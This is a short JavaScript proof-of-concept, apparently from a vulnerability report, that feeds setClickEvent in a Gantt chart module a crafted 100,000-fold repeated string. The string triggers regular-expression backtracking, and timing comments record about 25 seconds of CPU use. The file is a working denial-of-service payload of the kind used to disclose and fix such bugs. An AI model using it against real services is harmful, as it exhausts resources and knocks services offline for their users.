import { setClickEvent } from "./ganttDb.js";

//Attack String :""+"=,A"*100000+"@""
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "=,A";
}
str += '@"';

var result = setClickEvent("1", "a", str);

// real    0m25.064s
// user    0m25.034s
// sys     0m0.010s
